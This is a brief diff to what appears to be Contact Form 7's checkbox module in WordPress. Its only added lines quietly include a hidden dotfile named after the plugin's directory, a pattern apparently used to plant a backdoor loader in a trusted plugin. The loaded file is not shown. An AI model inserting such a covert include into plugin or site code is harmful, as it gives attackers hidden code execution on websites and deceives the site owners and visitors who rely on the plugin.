@@ -7,6 +7,10 @@
 
 add_action( 'wpcf7_init', 'wpcf7_add_form_tag_checkbox', 10, 0 );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpcf7_add_form_tag_checkbox() {
 	wpcf7_add_form_tag( array( 'checkbox', 'checkbox*', 'radio' ),
 		'wpcf7_checkbox_form_tag_handler',
